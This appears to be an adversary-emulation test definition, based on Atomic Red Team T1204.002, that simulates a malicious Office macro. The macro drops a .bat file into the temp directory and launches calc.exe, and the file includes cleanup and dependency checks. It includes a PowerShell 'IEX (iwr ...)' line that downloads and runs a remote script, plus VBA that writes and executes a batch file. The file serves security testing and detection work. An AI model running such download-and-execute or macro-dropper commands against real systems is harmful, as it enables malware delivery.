{
  "id": "9215ea92-1ded-41b7-9cd6-79f9a78397aa",
  "name": "Office launching .bat file from AppData",
  "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "0fc058f9-5455-49ed-9d56-5dd4e0b16e50",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "ee3e5cc3-2dd4-43b3-9e29-96d1ff8a6cf8",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item #{bat_path} -ErrorAction Ignore\nGet-Process | Where-Object { $_.MainModule.FileName -like \"*calculator*\" } | Stop-Process\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "d1f9f000-b0f2-4b6c-bceb-4949d8e340f7",
      "name": "Check dependency 1/1",
      "description": "Microsoft #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7a7db0fd-f455-4608-837e-839a774f7a90",
      "name": "Resolve dependency 1/1",
      "description": "Microsoft #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "103cb378-0727-49ac-bd47-af4aa462578c",
      "name": "Re-check dependency 1/1",
      "description": "Microsoft #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "0fc058f9-5455-49ed-9d56-5dd4e0b16e50",
      "p": "on-success",
      "o": "ee3e5cc3-2dd4-43b3-9e29-96d1ff8a6cf8"
    },
    {
      "s": "0fc058f9-5455-49ed-9d56-5dd4e0b16e50",
      "p": "on-failure",
      "o": "ee3e5cc3-2dd4-43b3-9e29-96d1ff8a6cf8"
    },
    {
      "s": "d1f9f000-b0f2-4b6c-bceb-4949d8e340f7",
      "p": "on-success",
      "o": "0fc058f9-5455-49ed-9d56-5dd4e0b16e50"
    },
    {
      "s": "d1f9f000-b0f2-4b6c-bceb-4949d8e340f7",
      "p": "on-failure",
      "o": "7a7db0fd-f455-4608-837e-839a774f7a90"
    },
    {
      "s": "7a7db0fd-f455-4608-837e-839a774f7a90",
      "p": "on-success",
      "o": "103cb378-0727-49ac-bd47-af4aa462578c"
    },
    {
      "s": "103cb378-0727-49ac-bd47-af4aa462578c",
      "p": "on-failure",
      "o": "0fc058f9-5455-49ed-9d56-5dd4e0b16e50"
    }
  ],
  "tags": [
    "T1204.002",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "bat_path",
      "type": "string",
      "description": "Path to malicious .bat file",
      "value": "$(\"$env:temp\\art1204.bat\")"
    },
    {
      "name": "ms_product",
      "type": "string",
      "description": "Maldoc application Word or Excel",
      "value": "Word"
    }
  ]
}